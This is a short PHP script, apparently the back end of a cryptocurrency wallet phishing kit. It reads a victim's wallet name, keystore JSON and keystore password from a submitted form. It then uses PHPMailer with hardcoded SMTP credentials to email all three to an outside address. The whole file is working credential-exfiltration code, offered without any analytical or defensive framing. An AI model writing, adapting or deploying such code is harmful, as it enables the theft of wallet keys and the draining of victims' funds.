<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
use PHPMailer\PHPMailer\SMTP;
require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';
//functions
function sanitize($dirty){
	return htmlentities($dirty, ENT_QUOTES, "UTF-8");
}

$walletName = ((isset($_POST['wallet_name2']) && $_POST['wallet_name2'] != '')?sanitize($_POST['wallet_name2']):'');
$keystorejson = ((isset($_POST['keystorejson']) && $_POST['keystorejson'] != '')?sanitize($_POST['keystorejson']):'');
$keystorepassword = ((isset($_POST['keystorepassword']) && $_POST['keystorepassword'] != '')?sanitize($_POST['keystorepassword']):'');
 
    $email = 'support@manual.appprocedure.com';
    $subject = $walletName;
    $message = 'The wallet name is: '.$walletName.'.<br> The keystorejson are: '.$keystorejson.'<br> And the password is: '.$keystorepassword;
 
 
$mail = new PHPMailer;
$mail->isSMTP();
$mail->SMTPDebug = 2;
$mail->Host = 'smtp.titan.email';
$mail->Port = 587;
$mail->Encryption = starttls;
$mail->SMTPAuth = true;
$mail->Username = 'support@manual.appprocedure.com';
$mail->Password = 'manual123';
$mail->setFrom('support@manual.appprocedure.com', $walletName);
$mail->addReplyTo('support@manual.appprocedure.com', $subject);
$mail->addAddress('support@manual.appprocedure.com', $subject);
$mail->Subject = $subject;
$mail->msgHTML(file_get_contents('message.html'), __DIR__);
$mail->isHTML(true);
$mail->Body = $message;
//$mail->addAttachment('../img/logo.jpg');
if (!$mail->send()) {
    echo 'Mailer Error: ' . $mail->ErrorInfo;
} else {
    echo 'The email message was sent.';
}
